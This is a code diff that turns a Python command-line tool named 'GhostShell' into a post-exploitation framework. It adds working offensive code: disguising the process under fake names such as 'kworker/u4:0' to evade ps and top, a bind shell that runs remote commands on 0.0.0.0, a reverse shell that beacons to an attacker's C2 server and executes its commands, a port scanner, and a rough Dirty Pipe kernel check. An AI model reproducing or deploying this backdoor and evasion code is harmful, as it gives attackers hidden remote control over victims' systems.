@@ -4,123 +4,266 @@ import socket
 import threading
 import os
 import time
-# Importăm noua bibliotecă de stealth
+import subprocess
 import setproctitle 
 from typing import List, Optional
-from typing_extensions import Annotated
 from rich.console import Console
 from rich.table import Table
 from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.panel import Panel
+import concurrent.futures
+import platform
 
-app = typer.Typer(help="GhostShell - Utilitar de Securitate Ofensivă")
+app = typer.Typer(help="GhostShell - Post-Exploitation & OS Manipulation Framework")
 console = Console()
 
-# --- MODUL 1: MANIPULARE OS (Ghost Mode V2) ---
+# --- UTILITIES ---
+
+def activate_ghost(name: str):
+    """Renames the process in system memory."""
+    with console.status(f"[bold green]Masquerading as '{name}'...[/bold green]", spinner="dots"):
+        time.sleep(1)
+        setproctitle.setproctitle(name)
+    console.print(f"[green]✔[/green] Process ID {os.getpid()} is now hidden as [cyan]{name}[/cyan]")
+
+def execute_command(cmd):
+    """Executes system commands and returns output, handling directory persistence."""
+    cmd = cmd.strip()
+    
+    # Optimization: Native handling for 'cd'
+    if cmd.startswith("cd "):
+        try:
+            target_dir = cmd[3:].strip()
+            os.chdir(target_dir)
+            return f"Changed directory to {os.getcwd()}".encode()
+        except FileNotFoundError:
+            return b"Error: Directory not found"
+        except Exception as e:
+            return str(e).encode()
+
+    try:
+        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+    except subprocess.CalledProcessError as e:
+        output = str(e.output).encode()
+    except Exception as e:
+        output = str(e).encode()
+    return output
+
+# --- MODULE 1: GHOST MODE (Evasion Only) ---
 
 @app.command()
-def ghost(
-    name: str = typer.Option("kworker/u4:0", help="Numele fals sub care să ruleze procesul")
+def ghost(name: str = typer.Option("kworker/u4:0", help="Fake process name")):
+    """
+    [DEFENSE EVASION] Process Masquerading. 
+    
+    Activates the Process Masquerading technique.
+    Under the hood: It doesn't just change the window title; it directly accesses process memory and overwrites command-line arguments (argv).
+    Result: Deceives standard monitoring tools (ps, top, htop).
+    """
+    console.print(Panel.fit(f"GHOST PROTOCOL ACTIVATED\nIdentity: {name}", style="red"))
+    activate_ghost(name)
+    try:
+        while True: time.sleep(1)
+    except KeyboardInterrupt:
+        console.print("\n[yellow]Ghost mode deactivated.[/yellow]")
+
+# --- MODULE 2: BIND SHELL (Persistence) ---
+
+def handle_bind_client(client_socket):
+    client_socket.send(b"\n=== GHOST BIND SHELL ===\n#> ")
+    while True:
+        try:
+            cmd = client_socket.recv(1024).decode().strip()
+            if cmd.lower() in ['exit', 'quit']: break
+            if not cmd: continue
+            output = execute_command(cmd)
+            client_socket.send(output + b"\n#> ")
+        except: break
+    client_socket.close()
+
+@app.command()
+def listen(
+    port: int = typer.Option(4444, help="Local port to listen on"),
+    name: str = typer.Option("systemd-resolved", help="Fake process name")
 ):
     """
-    [OS TRICK] Activează 'Ghost Mode'. Suprascrie ARGV și Process Title.
+    [PERSISTENCE] Bind Shell.
+    
+    Opens a backdoor on the victim's system.
+    Under the hood: Creates a server socket listening on 0.0.0.0.
+    Limitation: Easily detectable and often blocked by inbound firewall rules.
     """
-    console.print(Panel.fit(f"[bold red]Inițiere Protocol GHOST[/bold red]\nTarget Name: [cyan]{name}[/cyan]", border_style="red"))
+    activate_ghost(name)
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("0.0.0.0", port))
+    server.listen(5)
+    console.print(f"[yellow]Listening on port {port}...[/yellow]")
     
-    # Folosim spinner-ul 'dots' care este standard
-    with console.status("[bold green]Suprascriere memorie proces (argv)...[/bold green]", spinner="dots"):
-        time.sleep(1)
-        # Aici e magia care păcălește ps aux:
-        setproctitle.setproctitle(name)
-    
-    console.print(f"[bold green]✔ Succes![/bold green] Identitate schimbată în '{name}'.")
-    console.print("[yellow]Verificare:[/yellow] Rulează `ps aux | grep nginx` în celălalt terminal.")
-    
-    # Ținem procesul viu ca să îl putem vedea
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        console.print("\n[yellow]Ghost Mode dezactivat.[/yellow]")
+    while True:
+        client, addr = server.accept()
+        console.print(f"[green]Connection received from {addr}[/green]")
+        threading.Thread(target=handle_bind_client, args=(client,)).start()
 
-# --- MODUL 2: SCANNER REȚEA ---
+# --- MODULE 3: REVERSE SHELL (C2 Beaconing) ---
 
-def scan_port(ip, port, open_ports):
+@app.command()
+def connect(
+    ip: str = typer.Argument(..., help="Attacker's IP (C2 Server)"),
+    port: int = typer.Option(4444, help="Attacker's Port"),
+    name: str = typer.Option("chrome-extension-helper", help="Fake name (browser recommended)")
+):
+    """
+    [C2 BEACONING] Reverse Shell.
+    
+    Initiates a connection FROM the victim TO the attacker.
+    Under the hood: Simulates a web client accessing the internet.
+    Strategic Advantage: Bypasses most corporate firewalls because outbound traffic is usually allowed.
+    """
+    console.print(Panel(f"Connecting to C2 Server {ip}:{port}", title="Reverse Shell", style="bold red"))
+    activate_ghost(name)
+    
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            console.print("[dim]Attempting to connect...[/dim]")
+            s.connect((ip, port))
+            console.print("[green]Connected to Attacker's C2![/green]")
+            
+            # Send victim info
+            s.send(f"Connected from {socket.gethostname()} as {name}\n#> ".encode())
+            
+            while True:
+                data = s.recv(1024)
+                if not data: break
+                
+                cmd = data.decode().strip()
+                if cmd.lower() == 'exit': break
+                
+                if cmd:
+                    output = execute_command(cmd)
+                    s.send(output + b"\n#> ")
+                else:
+                    s.send(b"#> ")
+            s.close()
+        except Exception as e:
+            console.print(f"[red]Connection failed: {e}. Retrying in 5s...[/red]")
+            time.sleep(5)
+
+# --- MODULE 4: SCANNER (Reconnaissance) ---
+
+def scan_port(target, port, open_ports):
+    """Helper function to scan a single port."""
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(0.5)
-        result = sock.connect_ex((ip, port))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        result = s.connect_ex((target, port))
         if result == 0:
             open_ports.append(port)
-        sock.close()
+        s.close()
     except:
         pass
 
 @app.command()
 def scan(
-    target: str = typer.Argument(..., help="Adresa IP țintă"),
-    ports: str = typer.Option("1-1000", help="Interval de porturi (ex: 1-1000)"),
-    threads: int = typer.Option(100, help="Numărul de thread-uri paralele")
+    target: str = typer.Argument(..., help="Target IP or Domain"),
+    ports: str = typer.Option("1-1000", help="Port range (e.g., 1-1000)"),
+    threads: int = typer.Option(50, help="Number of concurrent threads")
 ):
     """
-    Scanner de porturi TCP multi-threaded.
-    """
-    console.print(f"[bold blue]Inițiere scanare pe {target}...[/bold blue]")
+    [RECONNAISSANCE] Port Scanner.
     
+    Scans for open ports on a remote target.
+    Under the hood: Uses TCP Sockets (SOCK_STREAM) and Multi-threading to verify hundreds of ports simultaneously.
+    Result: Identifies vulnerable services on the network.
+    """
+    console.print(Panel(f"Scanning {target} ports {ports}...", title="Network Scanner", style="bold blue"))
+    
+    # Parse port range
     try:
         start_port, end_port = map(int, ports.split('-'))
     except ValueError:
-        console.print("[red]Format porturi invalid. Folosește 'start-end' (ex: 1-100).[/red]")
+        console.print("[red]Invalid port range format. Use 'start-end' (e.g., 1-1000).[/red]")
         return
 
-    port_range = range(start_port, end_port + 1)
+    try:
+        target_ip = socket.gethostbyname(target)
+    except socket.gaierror:
+        console.print(f"[red]Could not resolve host: {target}[/red]")
+        return
+    
     open_ports = []
-    thread_list = []
-
+    start_time = time.time()
+    
     with Progress(
         SpinnerColumn(),
         TextColumn("[progress.description]{task.description}"),
         transient=True,
     ) as progress:
-        task = progress.add_task(f"[cyan]Scanare {len(port_range)} porturi...", total=len(port_range))
+        task = progress.add_task(f"[green]Scanning {target} ({target_ip})...", total=end_port - start_port)
         
-        for port in port_range:
-            t = threading.Thread(target=scan_port, args=(target, port, open_ports))
-            thread_list.append(t)
-            t.start()
-            while len(threading.enumerate()) > threads:
-                time.sleep(0.01)
-            progress.advance(task)
-
-        for t in thread_list:
-            t.join()
-
-    table = Table(title=f"Rezultate Scanare: {target}")
-    table.add_column("Port", justify="right", style="cyan", no_wrap=True)
-    table.add_column("Stare", style="green")
-    table.add_column("Serviciu", style="magenta")
-
-    common_ports = {22: "SSH", 80: "HTTP", 443: "HTTPS", 21: "FTP", 3306: "MySQL"}
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(scan_port, target_ip, port, open_ports): port for port in range(start_port, end_port + 1)}
+            
+            for future in concurrent.futures.as_completed(futures):
+                pass
     
+    end_time = time.time()
+    duration = end_time - start_time
+    
+    # Display Results
     if open_ports:
+        table = Table(title=f"Scan Report for {target} ({target_ip})")
+        table.add_column("Port", style="cyan")
+        table.add_column("Service", style="magenta")
+        table.add_column("Status", style="green")
+        
         for port in sorted(open_ports):
-            service = common_ports.get(port, "Unknown")
-            table.add_row(str(port), "OPEN", service)
+            try:
+                service = socket.getservbyport(port, "tcp")
+            except:
+                service = "unknown"
+                
+            table.add_row(str(port), service.upper(), "OPEN")
+        
         console.print(table)
+        console.print(f"\n[bold green]✔[/bold green] Finished scanning {end_port - start_port + 1} ports in [yellow]{duration:.2f} seconds[/yellow].")
     else:
-        console.print("[bold red]Niciun port deschis găsit.[/bold red]")
+        console.print(f"[red]No open ports found in range {ports} after {duration:.2f}s[/red]")
 
-# --- MODUL 3: AUDIT KERNEL ---
+# --- MODULE 5: AUDIT (Vulnerability Assessment) ---
 
 @app.command()
 def audit():
-    console.print(Panel("Analiză Versiune Kernel", title="Kernel Audit", border_style="yellow"))
-    try:
-        kernel_version = os.uname().release
-        console.print(f"Versiune Kernel: [bold white]{kernel_version}[/bold white]")
-        console.print(f"Sistem: [bold white]{os.uname().sysname}[/bold white]")
-    except Exception as e:
-        console.print(f"[red]Eroare: {e}[/red]")
+    """
+    [PRIVILEGE ESCALATION] Kernel Audit.
+    
+    Quickly checks kernel security status.
+    Under the hood: Compares the current kernel version (uname -r) with known critical vulnerability databases (e.g., Dirty Pipe - CVE-2022-0847).
+    """
+    console.print(Panel("Auditing Kernel Version...", title="System Audit", style="bold yellow"))
+    
+    kernel_version = platform.release()
+    console.print(f"Current Kernel: [bold white]{kernel_version}[/bold white]")
+    
+    # Simplified logic for Dirty Pipe (CVE-2022-0847)
+    # Affects kernel 5.8 to 5.16.11 / 5.15.25 / 5.10.102
+    is_vulnerable = False
+    if any(v in kernel_version for v in ["5.8", "5.10", "5.11", "5.12", "5.13", "5.14", "5.15"]):
+        is_vulnerable = True 
+        
+    table = Table(title="Vulnerability Report")
+    table.add_column("CVE", style="red")
+    table.add_column("Name", style="white")
+    table.add_column("Status", style="bold")
+    
+    if is_vulnerable:
+        table.add_row("CVE-2022-0847", "Dirty Pipe", "[red]VULNERABLE[/red]")
+        console.print(table)
+        console.print("\n[bold red]CRITICAL:[/bold red] System is likely vulnerable to local privilege escalation.")
+    else:
+        table.add_row("CVE-2022-0847", "Dirty Pipe", "[green]Safe[/green]")
+        console.print(table)
+        console.print("\n[green]System appears safe from high-profile kernel exploits.[/green]")
 
 if __name__ == "__main__":
     app()
